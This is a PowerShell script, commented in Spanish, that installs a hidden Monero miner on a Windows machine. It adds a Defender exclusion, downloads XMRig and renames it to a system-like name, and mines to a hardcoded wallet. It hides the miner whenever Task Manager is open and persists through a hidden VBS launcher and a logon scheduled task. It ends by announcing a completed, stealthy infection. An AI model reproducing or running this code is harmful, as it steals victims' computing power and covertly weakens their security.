# 1. Configuración de rutas y variables
$Folder = "$env:LOCALAPPDATA\WinPlatform"
$Bin = "$Folder\win_sys_service.exe"
$PsScript = "$Folder\task_monitor.ps1"
$VbsLaunch = "$Folder\run_hidden.vbs"
$Url = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$Wallet = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd.$($env:COMPUTERNAME)"

# 2. Creación de directorio y Exclusión inmediata
if (!(Test-Path $Folder)) { New-Item -ItemType Directory -Path $Folder -Force }
Add-MpPreference -ExclusionPath $Folder

# 3. Descarga y limpieza del binario
$Zip = "$Folder\u.zip"
Invoke-WebRequest -Uri $Url -OutFile $Zip
Expand-Archive $Zip -DestinationPath $Folder -Force
Move-Item "$Folder\xmrig-*\xmrig.exe" $Bin -Force
Remove-Item $Zip, "$Folder\xmrig-*" -Recurse -Force

# 4. Creación del Monitor (Cerebro)
$MonitorCode = @"
while(`$true) {
    if (Get-Process taskmgr -ErrorAction SilentlyContinue) {
        Stop-Process -Name 'win_sys_service' -Force -ErrorAction SilentlyContinue
    } else {
        if (!(Get-Process win_sys_service -ErrorAction SilentlyContinue)) {
            Start-Process '$Bin' -ArgumentList "-o pool.hashvault.pro:443 -u $Wallet -p x --cpu-max-threads-hint 35" -WorkingDirectory '$Folder' -WindowStyle Hidden
        }
    }
    Start-Sleep -Seconds 30
}
"@
[System.IO.File]::WriteAllText($PsScript, $MonitorCode)

# 5. Creación del Lanzador VBS (Sin errores de comillas)
$VbsCode = 'Set W = CreateObject("WScript.Shell"): W.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""' + $PsScript + '""", 0, False'
[System.IO.File]::WriteAllText($VbsLaunch, $VbsCode)

# 6. Registro de Persistencia
$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsLaunch`""
$Trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WinPlatformUpdate" -Action $Action -Trigger $Trigger -RunLevel Highest -Force

# 7. Ejecución inicial
wscript.exe "$VbsLaunch"
Write-Host "Infección completada. Sistema en sigilo." -ForegroundColor Green
